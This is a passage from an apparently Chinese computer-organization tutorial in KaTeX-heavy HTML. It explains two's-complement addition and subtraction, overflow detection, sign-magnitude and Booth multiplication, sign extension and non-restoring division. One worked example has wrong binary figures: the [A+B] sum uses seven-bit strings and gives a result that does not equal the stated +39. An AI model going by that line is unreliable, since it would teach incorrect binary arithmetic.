class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">（</span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">）</span></span></span></span></span></span></p>
<p><strong>补码运算的特点如下：</strong></p>
<ul>
<li>按二进制运算规则运算，逢二进一</li>
<li>若做加法，两数的补码直接相加；若做减法，则将被减数与减数的机器负数相加</li>
<li>符号位与数值位一起参与运算，加、减运算结果的符号位也在运算中直接得出</li>
<li>最终运算结果的高位丢弃，保留 <code>n + 1</code> 位，运算结果亦为补码</li>
</ul>
<p>例如：设机器字长为 <code>8</code> 位（含 <code>1</code> 位符号位），<em>A = 15，B = 24</em>，求 <em>[A + B]<sub>补</sub></em> 和 <em>[A - B]<sub>补</sub>。</em></p>
<p><em>A = +15 = +0001111，B = +24 = +0011000</em>；得 <em>[A]<sub>补</sub> = 00001111，[B]<sub>补</sub> = 00011000，[-B]<sub>补</sub> = 11101000</em>。所以</p>
<p><em>[A + B]<sub>补</sub> = 0000111 + 00011000 = 0010011</em>，符号位为 <code>0</code>，对应真值为 <code>+39</code>。
<em>[A - B]<sub>补</sub> = [A]<sub>补</sub> + [-B]<sub>补</sub> = 0001111 + 11101000 = 11110111</em>，符号位为 <code>1</code>，对应真值为 <code>-9</code>。</p>
</li>
<li>
<p><strong>补码加减运算电路</strong></p>
<p>已知一个数的补码表示为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，则这个数的负数的补码为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mtext>Y</mtext><mo>ˉ</mo></mover><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\text{\={Y}} + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9034em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">Y</span></span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，因此，只要在原加法器的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 输入端加 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个反向器以实现各位取反的功能，然后加一个 2 选 1 多路选择器，用一个控制端 Sub 来控制，以选择是将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 输入加法器还是将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mtext>Y</mtext><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\text{\={Y}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8201em;"></span><span class="mord text"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">Y</span></span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span></span></span></span></span> 输入加法器，并将控制端 Sub 同时作为低位进位送到加法器。</p>
<p>可通过标志信息来区分带符号整数运算结果和无符号整数运算结果。</p>
</li>
<li>
<p><strong>溢出判别方法</strong></p>
<p>仅当两个符号相同的数相加或两个符号相异的数相减才可能产生溢出。如：两个正数相加，而结果的符号位却为 <code>1</code>（结果为负）；一个负数减去一个正数，结果的符号位为 <code>0</code>（结果为正）。</p>
<p>补码定点数加减运算溢出判断的方法有三种：</p>
<ul>
<li>采用一位符号位</li>
<li>采用双符号位</li>
<li>采用一位符号位根据数据位的进位情况判断溢出</li>
</ul>
</li>
<li>
<p><strong>原码的加减法运算</strong></p>
<p>设 <em>[x]<sub>原</sub> = x<sub>s</sub>x<sub>1</sub>x<sub>2</sub>……x<sub>n</sub></em> 和 <em>[y]<sub>原</sub> = y<sub>s</sub>.y<sub>1</sub>y<sub>2</sub>……y<sub>n</sub></em>，进行加减运算的规则如下：</p>
<p><strong>加法规则</strong>：先判断符号位，若相同，则绝对值相加，结果符号位不变；若不同，则做减法，绝对值大的数减去绝对值小的数，结果符号位与绝对值大的数相同。
<strong>减法规则</strong>：两个原码表示的数相减，首先将减数符号取反，然后将被减数与符号取反后的减数原码加法进行运算。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>运算时注意机器字长，当左边位出现溢出时，将溢出位丢掉</p>
</div>
</li>
</ol>
<h4> 定点数的乘除运算</h4>
<ol>
<li>
<p><strong>定点数的乘法运算</strong></p>
<p>乘法运算由 <strong>累加</strong> 和 <strong>右移</strong> 操作实现，可分为原码一位乘法和补码一位乘法。</p>
<ul>
<li>
<p><strong>原码一位乘法</strong></p>
<p>原码一位乘法的特点是 <strong>符号位与数值位是分开求的</strong>，乘积符号由两个数的符号位 “异或” 形成，而乘积的数值部分则是两个数的绝对值相乘之积。</p>
<p>设 <em>[x]<sub>原</sub> = x<sub>s</sub>x<sub>1</sub>x<sub>2</sub>……x<sub>n</sub></em> 和 <em>[y]<sub>原</sub> = y<sub>s</sub>.y<sub>1</sub>y<sub>2</sub>……y<sub>n</sub></em>，则运算规则如下：</p>
<ol>
<li>被乘数和乘数均取绝对值参加运算，看作无符号数，符号位为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>s</mi></msub><mo>⊕</mo><msub><mi>y</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">x_s \oplus y_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li>
<li>部分积是乘法过程的中间结果。乘数的每一位 <em>y<sub>i</sub></em> 乘以被乘数得 <em>Xxy<sub>i</sub></em> 后，将该结果与前面所得的结果累加，就是部分积，初值为 <code>0</code></li>
<li>从乘数的最低位 <em>y<sub>n</sub></em> 开始判断：若 <em>y<sub>n</sub> = 1</em>，则部分积加上被乘数 |x|，然后右移一位；若 <em>y<sub>n</sub> = 0</em>，则部分积加上 0，然后右移一位</li>
<li>重复步骤 3，判断 n 次</li>
</ol>
<p>由于参与运算的是两个数的绝对值，因此运算过程中的右移操作均为逻辑右移。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>考虑到运算过程中部分积和乘数做加法时，可能出现部分积大于 1 的情况（产生进位），但此刻并非溢出，所以部分积和被乘数取双符号位</p>
</div>
<p>例如：<em>x = -0.1101，y = 0.1011</em>，采用原码一位乘法求 <code>x · y</code>。</p>
<p><em>|x| = 00.1101，|y| = 00.1011</em>。过程如下：</p>
<figure><figcaption>原码一位乘法</figcaption></figure>
<p>符号位 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>s</mi></msub><mo>=</mo><msub><mi>x</mi><mi>s</mi></msub><mo>⊕</mo><msub><mi>y</mi><mi>s</mi></msub><mo>=</mo><mn>1</mn><mo>⊕</mo><mn>0</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">P_s = x_s \oplus y_s = 1 \oplus 0 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，得 <em>x · y = -0.10001111</em>。</p>
</li>
<li>
<p><strong>补码一位乘法（Booth 算法）</strong></p>
<p>这是一种有符号数的乘法，采用相加和相减操作计算补码数据的乘积。</p>
<table>
<thead>
<tr>
<th style="text-align:center">y<sub>n</sub>（高位）</th>
<th style="text-align:center">y<sub>n+1</sub>（低位）</th>
<th style="text-align:left">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:left">部分积右移一位</td>
</tr>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:left">部分积加 [x]<sub>补</sub>，右移一位</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:left">部分积加 [-x]<sub>补</sub>，右移一位</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:left">部分积右移一位</td>
</tr>
</tbody>
</table>
<p>设 <em>[x]<sub>补</sub> = x<sub>s</sub>x<sub>1</sub>x<sub>2</sub>……x<sub>n</sub></em> 和 <em>[y]<sub>补</sub> = y<sub>s</sub>.y<sub>1</sub>y<sub>2</sub>……y<sub>n</sub></em>，则运算规则如下：</p>
<ol>
<li>符号位参与运算，运算的数均以补码表示</li>
<li>被乘数一般取双符号位参与运算，部分积取双符号位，初值为 0，乘数取单符号位</li>
<li>乘数末位增设附加位 <em>y<sub>n</sub> + 1</em>，初值为 0</li>
<li>根据（y<sub>n</sub>，y<sub>n+1</sub>）的取值来确定操作</li>
<li>移位按补码右移规则进行</li>
<li>按照上述算法进行 <code>n + 1</code> 步操作，但第 <code>n + 1</code> 步不再移位（共进行 <code>n + 1</code> 次累加和 <code>n</code> 次右移），仅根据 <em>y<sub>n</sub></em> 与 <em>y<sub>n+1</sub></em> 的比较结果做相应的运算</li>
</ol>
<p>例如：<em>x = -0.1101，y = 0.1011</em>，采用 Booth 算法求 <code>x · y</code>。</p>
<p><em>[x]<sub>补</sub> = 11.0011，[-x]<sub>补</sub> = 00.1101，[y]<sub>补</sub> = 0.1011</em>。过程如下：</p>
<figure><figcaption>补码一位乘法</figcaption></figure>
<p>所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">⋅</mo><mi>y</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>=</mo><mn>1.01110001</mn></mrow><annotation encoding="application/x-tex">[x · y]_\text{补} = 1.01110001</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1.01110001</span></span></span></span>，得 <em>x · y = -0.10001111</em>。</p>
</li>
</ul>
</li>
<li>
<p><strong>定点数的除法运算</strong></p>
<p>除法运算可转换成 <strong>累加一左移</strong>（逻辑左移），分为原码除法和补码除法。</p>
<ul>
<li>
<p><strong>符号扩展</strong></p>
<p>在算术运算中，有时必须把带符号的定点数转换成具有不同位数的表示形式。例如：某个程序需要将一个 <code>8</code> 位整数与另外一个 <code>32</code> 位整数相加，要想得到正确的结果，在将 <code>8</code> 位整数与 <code>32</code> 位整数相加之前，必须将 <code>8</code> 位整数转换成 <code>32</code> 位整数形式，这称为 <strong>符号扩展。</strong></p>
<p><strong>正数的符号扩展</strong> 非常简单，即符号位不变，新表示形式的所有扩展位都用 <code>0</code> 进行填充。</p>
<p><strong>负数的符号扩展</strong> 方法则根据机器数的不同而不同。原码表示负数的符号扩展方法与正数相同，只不过此时符号位为 <code>1</code>；补码表示负数的符号扩展方法：原有形式的符号位移动到新形式的符号位上，新表示形式的所有附加位都用 <code>1</code>（对于整数）或 <code>0</code>（对于小数）进行填充。</p>
</li>
<li>
<p><strong>原码除法运算（不恢复余数法）</strong></p>
<p><strong>原码不恢复余数法</strong> 也称原码加减交替除法。特点是商符和商值是分开进行的，减法操作用补码加法实现，商符由两个操作数的符号位 “异或” 形成。求商值的规则如下：</p>
<p>设被除数 <em>[X]<sub>原</sub> = x<sub>s</sub>x<sub>1</sub>x<sub>2</sub>……x<sub>n</sub></em>，除数 <em>[Y]<sub>原</sub> = y<sub>s</sub>.y<sub>1</sub>y<sub>2</sub>……y<sub>n</sub></em>，则</p>
<ol>
<li>商的符号：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mi>s</mi></msub><mo>=</mo><msub><mi>x</mi><mi>s</mi></msub><mo>⊕</mo><msub><mi>y</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">Q_s = x_s \oplus y_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li>
<li>商的数值：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>Q</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>X</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|Q| = |X| / |Y|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">Q</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣/∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span></span></span></span></li>
</ol>
<p>求 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>Q</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|Q|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">Q</span><span class="mord">∣</span></span></span></span> 的不恢复余数法运算规则如下：</p>
<ol>
<li>先用被除数减去除数（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>X</mi><mi mathvariant="normal">∣</mi><mo>−</mo><mi mathvariant="normal">∣</mi><mi>Y</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>X</mi><mi mathvariant="normal">∣</mi><mo>+</mo><mo stretchy="false">(</mo><mo>−</mo><mi mathvariant="normal">∣</mi><mi>Y</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">∣</mi><mi>X</mi><mi mathvariant="normal">∣</mi><mo>+</mo><mo stretchy="false">[</mo><mo>−</mo><mi mathvariant="normal">∣</mi><mi>Y</mi><mi mathvariant="normal">∣</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub></mrow><annotation encoding="application/x-tex">|X| - |Y| = |X| + (-|Y|) = |X| + [-|Y|]_\text{补}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>），当余数为正时，商上 <code>1</code>，余数和商左移一位，再减去除数；当余数为负时，商上 <code>0</code>，余数和商左移一位，再加上除数。</li>
<li>当第 <code>n + 1</code> 步余数为负时，需加上 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>Y</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|Y|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span></span></span></span> 得到第 <code>n + 1</code> 步正确的余数（余数与被除数同号）。</li>
</ol>
<p>例如：<em>x = 0.1011，y = 0.1101</em>，采用原码加减交替除法求 <code>x/y</code>。</p>
<p><em>|x| = 0.1011，|y| = 0.1101，[|y|]<sub>补</sub> = 0.1101，[-|y|]<sub>补</sub> = 1.0011</em>。过程如下：</p>
<figure><figcaption>原码除法</figcaption></figure>
<p>因此 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mi>s</mi></msub><mo>=</mo><msub><mi>x</mi><mi>s</mi></msub><mo>⊕</mo><msub><mi>y</mi><mi>s</mi></msub><mo>=</mo><mn>0</mn><mo>⊕</mo><mn>0</mn><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">Q_s = x_s \oplus y_s = 0 \oplus 0 = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" 